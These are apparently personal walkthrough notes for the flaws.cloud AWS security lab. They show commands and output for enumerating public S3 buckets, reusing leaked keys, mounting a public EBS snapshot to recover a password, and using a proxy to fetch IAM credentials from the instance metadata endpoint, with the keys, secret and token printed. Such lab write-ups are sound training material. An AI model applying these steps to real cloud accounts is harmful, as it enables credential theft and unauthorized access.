My notes for http://flaws.cloud

Level 1
-------

```
dig flaws.cloud
nslookup 52.218.224.202
curl 'flaws.cloud.s3.amazonaws.com/'
```

Level 2
-------

```
http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/
aws configure
aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
```

Level 3
-------

```
http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/
mkdir level3-flaws
cd level3-flaws
aws s3 cp --recursive s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ .
git diff HEAD^
aws configure --profile flaws
aws s3api list-buckets --profile flaws
```

```
{
    "Buckets": [
        {
            "Name": "2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud",
            "CreationDate": "2017-02-12T21:31:07.000Z"
        },
        {
            "Name": "config-bucket-975426262029",
            "CreationDate": "2017-05-29T16:34:53.000Z"
        },
        {
            "Name": "flaws-logs",
            "CreationDate": "2017-02-12T20:03:24.000Z"
        },
        {
            "Name": "flaws.cloud",
            "CreationDate": "2017-02-05T03:40:07.000Z"
        },
        {
            "Name": "level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud",
            "CreationDate": "2017-02-24T01:54:13.000Z"
        },
        {
            "Name": "level3-9afd3927f195e10225021a578e6f78df.flaws.cloud",
            "CreationDate": "2017-02-26T18:15:44.000Z"
        },
        {
            "Name": "level4-1156739cfb264ced6de514971a4bef68.flaws.cloud",
            "CreationDate": "2017-02-26T18:16:06.000Z"
        },
        {
            "Name": "level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud",
            "CreationDate": "2017-02-26T19:44:51.000Z"
        },
        {
            "Name": "level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud",
            "CreationDate": "2017-02-26T19:47:58.000Z"
        },
        {
            "Name": "theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud",
            "CreationDate": "2017-02-26T20:06:32.000Z"
        }
    ],
    "Owner": {
        "DisplayName": "0xdabbad00",
        "ID": "d70419f1cb589d826b5c2b8492082d193bca52b1e6a81082c36c993f367a5d73"
    }
}
```

Level 4
-------

```
aws iam get-user --profile flaws
```

```
User: arn:aws:iam::975426262029:user/backup
```

```
aws ec2 describe-snapshots --profile flaws --region us-west-2 --owner-ids 975426262029
```

```
{
    "Snapshots": [
        {
            "Description": "",
            "Encrypted": false,
            "OwnerId": "975426262029",
            "Progress": "100%",
            "SnapshotId": "snap-0b49342abd1bdcb89",
            "StartTime": "2017-02-28T01:35:12.000Z",
            "State": "completed",
            "VolumeId": "vol-04f1c039bc13ea950",
            "VolumeSize": 8,
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "flaws backup 2017.02.27"
                }
            ]
        }
    ]
}
```

```
aws ec2 copy-snapshot --region us-west-2 --source-region us-west-2 --source-snapshot-id snap-0b49342abd1bdcb89
```

https://us-west-2.console.aws.amazon.com/ec2/v2/home?region=us-west-2#Snapshots:sort=snapshotId

Create instance and attach volume

```
sudo mount /dev/xvdf1 /mnt
ls /mnt/home/ubuntu
```

flaws:nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M

Level 5
-------

http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/

http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws

```
{
  "Code" : "Success",
  "LastUpdated" : "2019-06-14T16:27:33Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA6GG7PSQG6JI2QJ5Z",
  "SecretAccessKey" : "zJRqHVWct/BWVZCgGAS2/2D2DCbeB7hc0hPBPUz1",
  "Token" : "AgoJb3JpZ2luX2VjEMn//////////wEaCXVzLXdlc3QtMiJIMEYCIQD1TW52LJJuQG9JR0jukvkuePJ86KJYqcmVlNt+meO91QIhAKKmUmn8DEQdEdtEQkH+PStRIhs0ekEsCIDL/oGtrmSjKuMDCPL//////////wEQABoMOTc1NDI2MjYyMDI5IgwGkZ9AIVbKIZgt+CoqtwOTyrkWeR/eLxvhLM3VFVdIyT6Ctv0pl+zRs4G1vta5ez3vaN59URUYoCgdBJBh8hZ3qqwsS+nD3SWtc57pq4Eo9CqU1dEkRUwvOgpcOaFK9z+RB3gRfycoTuLVbg4w2qDW3CxRXXl1H1I1zXmNkMtfyhtgVd7FVOV06I6cku/NWE0DnsWSA18H5feZ6Cr5MmRkeRnnje/8vXG9PXaZ4EeuW6s2nbz3LTc6sroy62ESm/HmT6VG0us+zTdN3el+XJB0+3hTxQ05+Z/UIp5pk2vLYjiMtfx3P7XVwLx18YyZDjtEoAbXeWOdZyJ5/Wb+I1TCGNAxpLoH8TYptktbLcpIxy68WeIl+lX61mfXwKYZhjBQEZ3yZ+eue5964Azyyh/360IVR8+ghR9Wgt1pbMg02uZ7HS74MlZU09Bz2UXFjpdo1JZeK2aMSTVy/1GLENjZ62fm1Jc36s/TuqE/dUvZpkv70e2afqxb5mS8I6aL9hKN9bPlR5FUvHFQNy6jnAz4Rlkgy7DgV38YuAGKOEu/3LcV+foU8+SU0PAu7Eb2qreQFuxQ45spWA4uB5ia0JKgTRyxC5RSMMaVj+gFOrMBFm7A/GPppqvwTHRsre+fM3AYWmXbgr9xsw3ynJlFAXnHI2xTFd6zr47b0/Hv04UTEl0e/2TqXVuDePCnOjhD1vglDnlgX1n8mHop8KzWxbOWuxMSJgnIpKGmXln0qoZHaRX/5L2/pQk6MNBJROUYGtsy0m+kFpRmj1R+PrN2G60WHHd9aCjYejPlS5/9PwP1e1hbT52Yl1zOCpFwq5ZgUBQfmHCqfX8lTTv9NXQZNvsaHMs=",
  "Expiration" : "2019-06-14T22:58:15Z"
}
```

```
[flaws]
aws_access_key_id = 
aws_secret_access_key = 
aws_session_token = 
```

```
aws s3 ls --profile flaws level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
```

Level 6
-------

http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/

```
aws --profile flaws --region us-west-2 logs describe-log-groups
```

```
{
    "logGroups": [
        {
            "logGroupName": "/aws/lambda/Level6",
            "creationTime": 1488155139704,
            "metricFilterCount": 0,
            "arn": "arn:aws:logs:us-west-2:975426262029:log-group:/aws/lambda/Level6:*",
            "storedBytes": 894925
        },
        {
            "logGroupName": "/aws/lambda/level5",
            "creationTime": 1487538045674,
            "metricFilterCount": 0,
            "arn": "arn:aws:logs:us-west-2:975426262029:log-group:/aws/lambda/level5:*",
            "storedBytes": 4599
        },
        {
            "logGroupName": "/aws/lambda/level6-0eb39b080b772f3cc1ee4b51ef790f376b482c33",
            "creationTime": 1487535264925,
            "metricFilterCount": 0,
            "arn": "arn:aws:logs:us-west-2:975426262029:log-group:/aws/lambda/level6-0eb39b080b772f3cc1ee4b51ef790f376b482c33:*",
            "storedBytes": 1196
        }
    ]
}
```

```
aws --profile flaws --region us-west-2 logs describe-log-streams --log-group-name "/aws/lambda/Level6"
aws --profile flaws --region us-west-2 logs describe-log-streams --log-group-name "/aws/lambda/level6-0eb39b080b772f3cc1ee4b51ef790f376b482c33"
aws --profile flaws iam get-user
```

```
{
    "User": {
        "Path": "/",
        "UserName": "Level6",
        "UserId": "AIDAIRMDOSCWGLCDWOG6A",
        "Arn": "arn:aws:iam::975426262029:user/Level6",
        "CreateDate": "2017-02-26T23:11:16Z"
    }
}
```

```
aws --profile flaws iam list-attached-user-policies --user-name Level6
```

```
{
    "AttachedPolicies": [
        {
            "PolicyName": "list_apigateways",
            "PolicyArn": "arn:aws:iam::975426262029:policy/list_apigateways"
        },
        {
            "PolicyName": "MySecurityAudit",
            "PolicyArn": "arn:aws:iam::975426262029:policy/MySecurityAudit"
        }
    ]
}
```

```
aws --profile flaws iam get-policy --policy-arn "arn:aws:iam::975426262029:policy/list_apigateways"
```

```
{
    "Policy": {
        "PolicyName": "list_apigateways",
        "PolicyId": "ANPAIRLWTQMGKCSPGTAIO",
        "Arn": "arn:aws:iam::975426262029:policy/list_apigateways",
        "Path": "/",
        "DefaultVersionId": "v4",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "List apigateways",
        "CreateDate": "2017-02-20T01:45:17Z",
        "UpdateDate": "2017-02-20T01:48:17Z"
    }
}
```

```
aws --profile flaws iam get-policy-version --policy-arn "arn:aws:iam::975426262029:policy/list_apigateways" --version-id "v4"
```

```
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Action": [
                        "apigateway:GET"
                    ],
                    "Effect": "Allow",
                    "Resource": "arn:aws:apigateway:us-west-2::/restapis/*"
                }
            ]
        },
        "VersionId": "v4",
        "IsDefaultVersion": true,
        "CreateDate": "2017-02-20T01:48:17Z"
    }
}
```

```
aws --profile flaws --region us-west-2 apigateway get-rest-apis
```

```
An error occurred (AccessDeniedException) when calling the GetRestApis operation: User: arn:aws:iam::975426262029:user/Level6 is not authorized to perform: apigateway:GET on resource: arn:aws:apigateway:us-west-2::/restapis
```

```
aws --profile flaws --region us-west-2 lambda list-functions
```

```
{
    "Functions": [
        {
            "FunctionName": "Level6",
            "FunctionArn": "arn:aws:lambda:us-west-2:975426262029:function:Level6",
            "Runtime": "python2.7",
            "Role": "arn:aws:iam::975426262029:role/service-role/Level6",
            "Handler": "lambda_function.lambda_handler",
            "CodeSize": 282,
            "Description": "A starter AWS Lambda function.",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2017-02-27T00:24:36.054+0000",
            "CodeSha256": "2iEjBytFbH91PXEMO5R/B9DqOgZ7OG/lqoBNZh5JyFw=",
            "Version": "$LATEST",
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "22f08307-9080-4403-bf4d-481ddc8dcb89"
        }
    ]
}
```

```
aws --profile flaws --region us-west-2 lambda get-policy --function-name Level6
```

```
{
    "Policy": "{\"Version\":\"2012-10-17\",\"Id\":\"default\",\"Statement\":[{\"Sid\":\"904610a93f593b76ad66ed6ed82c0a8b\",\"Effect\":\"Allow\",\"Principal\":{\"Service\":\"apigateway.amazonaws.com\"},\"Action\":\"lambda:InvokeFunction\",\"Resource\":\"arn:aws:lambda:us-west-2:975426262029:function:Level6\",\"Condition\":{\"ArnLike\":{\"AWS:SourceArn\":\"arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\"}}}]}",
    "RevisionId": "22f08307-9080-4403-bf4d-481ddc8dcb89"
}
```

```
aws --profile flaws --region us-west-2 apigateway get-rest-api --rest-api-id s33ppypa75
```

```
{
    "id": "s33ppypa75",
    "name": "Level6",
    "createdDate": 1488154895,
    "apiKeySource": "HEADER",
    "endpointConfiguration": {
        "types": [
            "EDGE"
        ]
    },
    "tags": {}
}
```

```
aws --profile flaws --region us-west-2 apigateway get-stages --rest-api-id s33ppypa75
```

```
{
    "item": [
        {
            "deploymentId": "8gppiv",
            "stageName": "Prod",
            "cacheClusterEnabled": false,
            "cacheClusterStatus": "NOT_AVAILABLE",
            "methodSettings": {},
            "tracingEnabled": false,
            "createdDate": 1488155168,
            "lastUpdatedDate": 1488155168
        }
    ]
}
```

https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6

The end
-------

http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/
